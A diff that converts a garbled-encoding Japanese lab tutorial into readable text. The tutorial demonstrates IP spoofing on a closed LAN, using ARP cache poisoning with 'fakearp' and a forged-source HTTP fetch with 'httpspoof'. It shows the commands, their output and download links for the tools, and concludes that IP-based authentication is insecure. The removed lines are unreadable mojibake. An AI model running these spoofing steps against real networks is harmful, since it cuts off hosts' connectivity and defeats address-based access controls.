@@ -1,11 +1,11 @@
-  IP�X�v�[�t�B���O�Ƃ����ƁA1994�N�ɃP�r���E�~�g�j�b�N�����̎�@�ŉ����w�̃R���s���[�^�[���N���b�N�����������L���ł��B���̍I���ȃN���b�N�Z�p�́A���݂̑����̃V�X�e�����������Ă��郉���_���ȃV�[�P���X�ԍ��������@�̑O�ł́A���s������ƂȂ��Ă��܂����A�t�������΁A�V�[�P���X�ԍ�����������Ȃ�΃X�v�[�t�B���O���\�Ƃ������ɂȂ�܂��B�Ƃ�����ŁA����͂�������؂��邽�߁A������ƕς����IP�X�v�[�t�B���O�̎������s���܂��B
+  IPスプーフィングというと、1994年にケビン・ミトニックがこの手法で下村努のコンピューターをクラックした事件が有名です。この巧妙なクラック技術は、現在の多くのシステムが実装しているランダムなシーケンス番号生成方法の前では、実行が困難となっていますが、逆を言えば、シーケンス番号さえ分かるならばスプーフィングが可能という事になります。という訳で、今回はこれを実証するため、ちょっと変わったIPスプーフィングの実験を行います。
 
-  ���̎����͕����ꂽLAN(Local Area Network)���ōs���܂��B�ړI�́A������IP�A�h���X���\����HTTP�T�[�o�[�֐ڑ�(���ۂɂ͐ڑ����Ȃ�)�A�g�b�v�y�[�W���擾����Ƃ������̂ł��B���M���A�h���X��LAN���ɐڑ�����Ă���z�X�g�ŁA���̃z�X�g��HTTP�T�[�o�[�Ԃ��ꎞ�I�ɒʐM�s�\�ɂ���IP�X�v�[�t�B���O���s���܂��B�Ȃ��A�ʐM�s�\����K�v������̂��Ƃ����ƁA�ʐM�s�\�ɂ���IP�X�v�[�t�B���O���s���ƁA���M���z�X�g��RST(���Z�b�g)�p�P�b�g��HTTP�T�[�o�[�ɑ��M���Ă��܂��A�R�l�N�V���������Z�b�g����Ă��܂��ׂł��BDOS�A�^�b�N��IP�X�v�[�t�B���O�̑O���ƌ�����̂͂��̂��߂ł��B�ł́AIP�X�v�[�t�B���O���s���菇��������܂��B
-  �܂��A�^�[�Q�b�g��HTTP�T�[�o�[��ARP�X�v�[�t�B���O�����s���āA���M���z�X�g�Ƃ̒ʐM���ꎞ�I�ɕs�\�ɂ��܂��B���ɁAHTTP�T�[�o�[�̃|�[�g80�Ԃ�SYN�t���O�𗧂Ă��p�P�b�g�𑗐M���܂��B�T�[�o�[�̃|�[�g80�Ԃ��J���Ă���΁AACK+SYN�ŉ������Ă���̂ŁA�R�E�F�C�E�n���h�V�F�[�N�̍ŏI�i�K�����s���ăR�l�N�V�������m�������܂��B���̂��ƁAGET�R�}���h�𑗐M���� �ړI�̃t�@�C�����擾���܂��B���̎����̓X�C�b�`�Ő؂��Ă��Ȃ��l�b�g���[�N�A�܂�_���n�u�Őڑ����ꂽ�l�b�g���[�N���g�p���܂��B����́A�ʏ�̎�@�ł̓X�C�b�`���O�n�u���g�p����ƁA�������ĂłȂ��p�P�b�g��⑫�ł��Ȃ�����ł��B�Z�p�I�ɂ́A�X�C�b�`���O�n�u���g�p���Ă��p�P�b�g�̕⑫�͉\�Ȃ̂ł����A������n�߂�ƍX�ɕʂ̎菇�𓥂ޕK�v������̂ŁA����ɂ��Ă͕ʂ̋@��ɍs�������Ǝv���܂��B
-  ���āAIP�X�v�[�t�B���O���s���͂��Ȃ̂ɁAARP�X�v�[�t�B���O�Ȃ�Ă̂��o�Ă��ċ^�����������������ł��傤����A�p�P�b�g���l�b�g���[�N���ɗ����ߒ����ȒP�ɐ������܂��B
-  �z�X�g"hoge.com"��HTTP�N���C�A���g�Őڑ�����Ɖ��肵�܂��傤�B�܂��A"hoge.com"�̃z�X�g�����������邽�߂�gethostbyname(3)���Ăяo���ăz�X�g���̉��������݂܂��B�z�X�g��������������ATCP�ֈ���IP�A�h���X�Ƃ̃R�l�N�V�����̊m����v�����܂��B����̂悤�Ɉ���z�X�g�����[�J���l�b�g���[�N���ɐڑ�����Ă���Ȃ�΁A�p�P�b�g�𒼐ڈ���z�X�g�֑��M���܂��B�����ŁAEthernet�Őڑ����Ă���ꍇ�AIP�A�h���X��Ethernet�A�h���X�֕ϊ�������K�v������܂��BIP�A�h���X��Ethernet�A�h���X�̑g�ݍ��킹��ARP�L���b�V���Ō������A������Ȃ��Ȃ�΃l�b�g���[�N����ARP�v���𑗐M���ĉ������s���܂��B
-  ARP�͊m�F�����̕K�v���Ȃ��̂ŁA��r�I�ȒP�ɃX�v�[�t�B���O���s���܂��B�������A�ȒP�Ƃ����Ă����̉e���͑傫���A�l�b�g���[�N�S�̂�ʐM�s�\���鎖���\�ȁA���Ȃ�A�u�i�C���̂ł��B�����ARP�X�v�[�t�B���O�́A�u���[�h�L���X�g�֌�����HTTP�T�[�o�[��Ethernet�A�h���X�������s���܂��BIP�A�h���X���X�v�[�t�B���O�Ɏg�p���鑗�M���A�h���X�ɐݒ肵�āAEthernet�A�h���X���ˋ�̃A�h���X�ɂ��܂��BARP�v�����󂯎����HTTP�T�[�o�[�́A�U�̗v���ɔ������đ��M���A�h���X��Ethernet�A�h���X���ˋ�̃A�h���X�ɍX�V���܂��BHTTP�T�[�o�[�͍X�V���ꂽ�ˋ��Ethernet�A�h���X�ƒʐM���s�����Ƃ��邽�߁A�ʐM�s�\�ƂȂ��Ă��܂��܂��B
-  �����Ă݂܂��傤�B�����p�ɍ쐬����"fakearp"���g�p���āA192.168.64.1��192.168.64.5�Ԃ̒ʐM��W�Q���Ă݂܂��B�܂���arp�e�[�u�����m�F���܂��傤�B
+  この実験は閉ざされたLAN(Local Area Network)内で行います。目的は、自分のIPアドレスを欺いてHTTPサーバーへ接続(実際には接続しない)、トップページを取得するというものです。送信元アドレスはLAN内に接続されているホストで、このホストとHTTPサーバー間を一時的に通信不能にしてIPスプーフィングを行います。なぜ、通信不能する必要があるのかというと、通信不能にせずIPスプーフィングを行うと、送信元ホストがRST(リセット)パケットをHTTPサーバーに送信してしまい、コネクションがリセットされてしまう為です。DOSアタックがIPスプーフィングの前兆と言われるのはこのためです。では、IPスプーフィングを行う手順を説明します。
+  まず、ターゲットのHTTPサーバーへARPスプーフィングを実行して、送信元ホストとの通信を一時的に不能にします。次に、HTTPサーバーのポート80番へSYNフラグを立てたパケットを送信します。サーバーのポート80番が開いていれば、ACK+SYNで応答してくるので、３ウェイ・ハンドシェークの最終段階を実行してコネクションを確立させます。そのあと、GETコマンドを送信して 目的のファイルを取得します。この実験はスイッチで切られていないネットワーク、つまりダムハブで接続されたネットワークを使用します。これは、通常の手法ではスイッチングハブを使用すると、自分宛てでないパケットを補足できないからです。技術的には、スイッチングハブを使用してもパケットの補足は可能なのですが、これを始めると更に別の手順を踏む必要があるので、それについては別の機会に行いたいと思います。
+  さて、IPスプーフィングを行うはずなのに、ARPスプーフィングなんてのが出てきて疑問を感じた方もいるでしょうから、パケットがネットワーク内に流れる過程を簡単に説明します。
+  ホスト"hoge.com"へHTTPクライアントで接続すると仮定しましょう。まず、"hoge.com"のホスト名を解決するためにgethostbyname(3)を呼び出してホスト名の解決を試みます。ホスト名を解決したら、TCPへ宛先IPアドレスとのコネクションの確立を要求します。今回のように宛先ホストがローカルネットワーク内に接続されているならば、パケットを直接宛先ホストへ送信します。ここで、Ethernetで接続している場合、IPアドレスをEthernetアドレスへ変換させる必要があります。IPアドレスとEthernetアドレスの組み合わせをARPキャッシュで検索し、見つからないならばネットワーク内にARP要求を送信して解決を行います。
+  ARPは確認応答の必要がないので、比較的簡単にスプーフィングが行えます。しかし、簡単といってもその影響は大きく、ネットワーク全体を通信不能する事も可能な、かなりアブナイものです。今回のARPスプーフィングは、ブロードキャストへ向けてHTTPサーバーのEthernetアドレス解決を行います。IPアドレスをスプーフィングに使用する送信元アドレスに設定して、Ethernetアドレスを架空のアドレスにします。ARP要求を受け取ったHTTPサーバーは、偽の要求に反応して送信元アドレスのEthernetアドレスを架空のアドレスに更新します。HTTPサーバーは更新された架空のEthernetアドレスと通信を行おうとするため、通信不能となってしまいます。
+  試してみましょう。実験用に作成した"fakearp"を使用して、192.168.64.1と192.168.64.5間の通信を妨害してみます。まずはarpテーブルを確認しましょう。
 
 (192.168.64.5)
 C:\>arp -a
@@ -16,7 +16,7 @@ Interface: 192.168.64.5 on Interface 0x1000003
 
 C:\>
 
-���̏�Ԃ�192.168.64.1��Ping���΂��ƁA����ɔ��������鎖���m�F�o���܂��B
+この状態で192.168.64.1にPingを飛ばすと、正常に反応がある事を確認出来ます。
 
 C:\>ping 192.168.64.1
 
@@ -34,11 +34,11 @@ Approximate round trip times in milli-seconds:
 
 C:\>
 
-192.168.64.1��Ethernet�A�h���X��"aa-bb-cc-dd-ee-ff"�ɍX�V������192.168.64.1�Ƃ̒ʐM��s�\�ɂ��܂��B
+192.168.64.1のEthernetアドレスを"aa-bb-cc-dd-ee-ff"に更新させて192.168.64.1との通信を不能にします。
 
 # fakearp 192.168.64.5 -shw aa:bb:cc:dd:ee:ff -spa 192.168.64.1 -i eth1
 
-���̃R�}���h�����s�����ARP�e�[�u�����X�V����܂��B
+このコマンドを実行するとARPテーブルが更新されます。
 (192.168.64.5)
 C:\>arp -a
 
@@ -48,7 +48,7 @@ Interface: 192.168.64.5 on Interface 0x1000003
 
 C:\>
 
-���̎��_�ŁA192.168.64.1��192.168.64.5�Ԃ�ARP�L���b�V�����؂�邩�A�������A�h���X�ɍX�V�����܂ŒʐM�s�\�ƂȂ�APing���΂��Ă��Ԃ��Ă��鎖�͂���܂���B
+この時点で、192.168.64.1と192.168.64.5間はARPキャッシュが切れるか、正しいアドレスに更新されるまで通信不能となり、Pingを飛ばしても返ってくる事はありません。
 
 C:\>ping 192.168.64.1
 
@@ -66,12 +66,12 @@ Approximate round trip times in milli-seconds:
 
 C:\>
 
-192.168.64.1���C���^�[�l�b�g�ւ̃Q�[�g�E�F�C�ł���ꍇ�ALAN����o�鎖���o�����C���^�[�l�b�g�ւ̐ڑ��͏o���Ȃ��Ȃ�܂��B�X�ɕt�������Ă����ƁAfakearp�̓f�t�H���g�ł͈���n�[�h�E�F�A�A�h���X��FF:FF:FF:FF:FF:FF(�u���[�h�L���X�g)�̃p�P�b�g�𑗐M����̂ŁA���̃p�P�b�g���󂯎�����S�Ẵ}�V�����ʐM�s�\�ƂȂ�댯��������܂��B�s���|�C���g�ōs���ɂ͈���n�[�h�E�F�A�A�h���X���w�肵�ĉ������B
+192.168.64.1がインターネットへのゲートウェイである場合、LANから出る事が出来ずインターネットへの接続は出来なくなります。更に付け加えておくと、fakearpはデフォルトでは宛先ハードウェアアドレスがFF:FF:FF:FF:FF:FF(ブロードキャスト)のパケットを送信するので、このパケットを受け取った全てのマシンが通信不能となる危険性があります。ピンポイントで行うには宛先ハードウェアアドレスを指定して下さい。
 
-  �����IP�X�v�[�t�B���O��ړI�Ƃ��Ă���̂ŁAARP�X�v�[�t�B���O�ɂ��Ă͂����܂łƂ��āA�U��TCP�R�l�N�V�������m��������ߒ���ǂ��čs���܂��B
-  TCP�͐ڑ��w���ł��邽�߁A�N���C�A���g�^�T�[�o�[�ԂŃR�l�N�V�����̊m�����s���܂��B�R�l�N�V�����̊m���ƍē]����t���[���䓙��TCP���x���ōs�����߃w�b�_�[�T�C�Y��20�o�C�g�ƁAUDP�̔{�ȏ゠��܂����M������ۏ؂��܂��BIP, TCP�w�b�_�[�͎��̂悤�ȍ\���ɂȂ��Ă��܂��B
+  今回はIPスプーフィングを目的としているので、ARPスプーフィングについてはここまでとして、偽のTCPコネクションを確立させる過程を追って行きます。
+  TCPは接続指向であるため、クライアント／サーバー間でコネクションの確立を行います。コネクションの確立と再転送やフロー制御等をTCPレベルで行うためヘッダーサイズが20バイトと、UDPの倍以上ありますが信頼性を保証します。IP, TCPヘッダーは次のような構成になっています。
 
-IP�w�b�_�[(RFC791���甲��)
+IPヘッダー(RFC791から抜粋)
     0                   1                   2                   3
     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
@@ -88,7 +88,7 @@ IP�w�b�_�[(RFC791���甲��)
    |                    Options                    |    Padding    |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
-TCP�w�b�_�[(RFC793���甲��)
+TCPヘッダー(RFC793から抜粋)
     0                   1                   2                   3
     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
@@ -109,7 +109,7 @@ TCP�w�b�_�[(RFC793���甲��)
    |                             data                              |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
-�R�l�N�V�����̊m�����s���ɂ́A�܂�����z�X�g�̐ڑ��������|�[�g��SYN�t���O�𗧂Ă��p�P�b�g�𑗐M���܂��B�|�[�g���J���Ă���Ȃ�΁AACK+SYN�ŉ������Ă���̂ŁAACK�t���O�𗧂Ă��p�P�b�g�𑗐M���ăR�l�N�V�������m�������܂��B������Ղ���������ƁA���̂悤�ȍs���ƂȂ�܂��B
+コネクションの確立を行うには、まず宛先ホストの接続したいポートへSYNフラグを立てたパケットを送信します。ポートが開いているならば、ACK+SYNで応答してくるので、ACKフラグを立てたパケットを送信してコネクションを確立させます。分かり易く説明すると、次のような行程となります。
 
   Client                                                      Server
   +                                                                +
@@ -125,34 +125,34 @@ TCP�w�b�_�[(RFC793���甲��)
   |                                                                |
   +                                                                +
 
-�N���C�A���g�̓V�[�P���X�ԍ���1000��ݒ肵�Đڑ��v�����o���Ă��܂��B����ɉ�������T�[�o�[�̓V�[�P���X�ԍ���5000��ݒ肵�āA�m�F�����ԍ��ɃN���C�A���g�̐ݒ肵���V�[�P���X�ԍ���1�𑫂���1001��ݒ肵�ĉ������܂��B�Ō�ɃN���C�A���g�̓T�[�o�[�̐ݒ肵���m�F�����ԍ������V�[�P���X�ԍ��ɁA�V�[�P���X�ԍ���1�𑫂���5001���m�F�����ԍ��ɐݒ肵�āA�p�P�b�g�𑗐M���܂��B���̃p�P�b�g���T�[�o�[���󂯎�������_�ŃR�l�N�V�������m�����܂��B���̂悤��3�i�K�ɓn���Ă������s�����߁A�u3�E�F�C�E�n���h�V�F�[�N�v��u3�X�e�b�v�E�n���h�V�F�[�N�v�ȂǂƌĂ΂�܂��B
+クライアントはシーケンス番号に1000を設定して接続要求を出しています。これに応答するサーバーはシーケンス番号に5000を設定して、確認応答番号にクライアントの設定したシーケンス番号に1を足した1001を設定して応答します。最後にクライアントはサーバーの設定した確認応答番号ををシーケンス番号に、シーケンス番号に1を足した5001を確認応答番号に設定して、パケットを送信します。このパケットをサーバーが受け取った時点でコネクションが確立します。このように3段階に渡ってやり取りを行うため、「3ウェイ・ハンドシェーク」や「3ステップ・ハンドシェーク」などと呼ばれます。
 
-�����Ɏg�p����l�b�g���[�N�̍\���͎��̂悤�Ȃ��̂ł��B
+実験に使用するネットワークの構成は次のようなものです。
 
-�U����<Linux>
+攻撃者<Linux>
 [192.168.64.3]-------------------[HUB]
                                   | |
-                                  | |      HTTP�T�[�o�[<NetBSD>
+                                  | |      HTTPサーバー<NetBSD>
 [192.168.64.5]--------------------+ +------[192.168.64.4]
-�U�������z�X�g<Windows NT>
+偽装されるホスト<Windows NT>
 
-192.168.64.4�ł́AHTTP�T�[�o�[�Ƃ���Apache�����삵�Ă���A�g�b�v�y�[�W��index.html�ɂ͎��̂悤�ȓ��e�̃t�@�C����p�ӂ��܂����B
+192.168.64.4では、HTTPサーバーとしてApacheが動作しており、トップページのindex.htmlには次のような内容のファイルを用意しました。
 
 (index.html)
 --------8<------------------8<--------
 
 <html>
-�R(�L�[`)�m������I���������H
+ヽ(´ー`)ノ＜よっ！成功かい？
 </html>
 
 --------8<------------------8<--------
 
-�܂��A192.168.64.4��ARP�X�v�[�t�B���O�����s����192.168.64.5�Ƃ̒ʐM��s�\�ɂ��Ă����܂��B���̃R�}���h�����s����ƁAHTTP�T�[�o�[��192.168.64.5�ƒʐM���o���Ȃ��Ȃ�܂��B
+まず、192.168.64.4へARPスプーフィングを実行して192.168.64.5との通信を不能にしておきます。このコマンドを実行すると、HTTPサーバーは192.168.64.5と通信が出来なくなります。
 
 [r00t@192.168.64.3]# fakearp 192.168.64.4 -spa 192.168.64.5 -shw 00:fe:7f:1c:86:fa -i eth1
 
-����IP�X�v�[�t�B���O�����s���āA�T�[�o�[�ւ̐ڑ��E�g�b�v�y�[�W�̎擾�����݂܂��B
-�ܘ_�A���ۂɐڑ����鎖�͂���܂���B�U�̐ڑ��ł��B
+次にIPスプーフィングを実行して、サーバーへの接続・トップページの取得を試みます。
+勿論、実際に接続する事はありません。偽の接続です。
 
 [r00t@192.168.64.3]# ./hs http://192.168.64.4/ -s 192.168.64.5
 phase 1 - Send SYN to 192.168.64.4 (seq 0x42e7ffd5 ack 0x0)... Success
@@ -170,18 +170,18 @@ Connection: close
 Content-Type: text/html
 
 <html>
-�R(�L�[`)�m������I���������H
+ヽ(´ー`)ノ＜よっ！成功かい？
 </html>
 
 phase 5 - recved FIN
 phase 6 - Final, send ACK|FIN to 192.168.64.4... Success
 
-�g�b�v�y�[�W���擾�o�����̂ŁAHTTP�T�[�o�[��Ń��O�t�@�C�����m�F���āA�A�N�Z�X���Ă����A�h���X�𒲂ׂĂ݂܂��B
+トップページが取得出来たので、HTTPサーバー上でログファイルを確認して、アクセスしてきたアドレスを調べてみます。
 
 [r00t@192.168.64.4]# cat access_log
 192.168.64.5 - - [02/Oct/2003:16:40:40 +0900] "GET / HTTP/1.0" 200 45
 
-192.168.64.5�������[�g�z�X�g�Ƃ��ċL�^����Ă��܂��B����netstat�ő��M���A�h���X���U���o���Ă��鎖���m�F���܂��傤�B
+192.168.64.5がリモートホストとして記録されています。次にnetstatで送信元アドレスが偽装出来ている事を確認しましょう。
 
 [r00t@192.168.64.4]# netstat -an
 Active Internet connections (including servers)
@@ -195,11 +195,11 @@ Active UNIX domain sockets
 Address  Type   Recv-Q Send-Q    Inode     Conn     Refs  Nextref Addr
 c084a000 dgram       0      0 c3e09804        0        0        0 /var/run/log
 
-  ���̂悤�ɁA�ȒP�ɃA�h���X���U���o���鎖���m�F�o���܂����B����͉���HTTP�Ɍ��炸�A���̃v���g�R���ł����s�\�ŁA���Ƃ�Tcpwrapper��t�@�C�A�E�H�[���ŕی삵�Ă��Ă��A�����Ă���A�h���X����������Ηe�Ղɓ˔j�o���邱�Ƃ͑z���Ɍł��Ȃ��ł��傤�B����͖��炩�ɃZ�L�����e�B�[�z�[���ł���AIP�A�h���X�ŔF�؂��s���댯����\���Ă��܂��B
+  このように、簡単にアドレスを偽装出来る事が確認出来ました。これは何もHTTPに限らず、他のプロトコルでも実行可能で、たとえTcpwrapperやファイアウォールで保護していても、許可しているアドレスさえ分かれば容易に突破出来ることは想像に固くないでしょう。これは明らかにセキュリティーホールであり、IPアドレスで認証を行う危険性を表しています。
 
-  �g�p�����e�X�g�v���O�����͈ȉ���URL����_�E�����[�h�o���܂��B�R���p�C���E���s�͂���������Ă��鎞�_�ł�Linux/NetBSD�Ŋm�F���Ă��܂��Bfakearp��/dev/bpf* �����݂���Ȃ�΁A�����C�����邾���ŃR���p�C���\���Ǝv���̂ŁA���s�������͎����ŏC�����Ă��������B���̃v���O�����͊ȒP�Ɏ��s�o���܂����A�ꍇ�ɂ���Ă̓l�b�g���[�N�ɑ傫�ȉe����^�����˂Ȃ��̂ŁA�\���ɒ��ӂ��ĉ������Bhttpspoof(hs)�͑���Unix�ŃR���p�C���E���s�o����͂��Ȃ̂ŁA��������s�������͎����ŏC�������s���ĉ������B���Ȃ݂ɁAlibpcap���K�v�ł��B
+  使用したテストプログラムは以下のURLからダウンロード出来ます。コンパイル・実行はこれを書いている時点ではLinux/NetBSDで確認しています。fakearpは/dev/bpf* が存在するならば、多少修正するだけでコンパイル可能だと思うので、失敗した方は自分で修正してください。このプログラムは簡単に実行出来ますが、場合によってはネットワークに大きな影響を与えかねないので、十分に注意して下さい。httpspoof(hs)は大抵のUnixでコンパイル・実行出来るはずなので、これも失敗した方は自分で修正等を行って下さい。ちなみに、libpcapが必要です。
 
 http://idzero.s35.xrea.com/release/tools/fakearp.html
 http://idzero.s35.xrea.com/samples/httpspoof.tgz
 
-  ����͓���̏��Ȃ��f�[�^�����N�w�ɐG��Ă�����̂́A�\���ɉ�����o���Ă��炸�A������Â炢��������Ǝv���܂��BEthernet�A�h���X�֘A�ɂ��ẮAVol.1�uMAC�A�h���X�čl�v��IPUSIRON���񂪉�����Ă���̂ŁA��������Q�Ƃ��ĉ������B
+  今回は馴染の少ないデータリンク層に触れているものの、十分に解説が出来ておらず、分かりづらい個所があると思います。Ethernetアドレス関連については、Vol.1「MACアドレス再考」でIPUSIRONさんが解説しているので、そちらを参照して下さい。
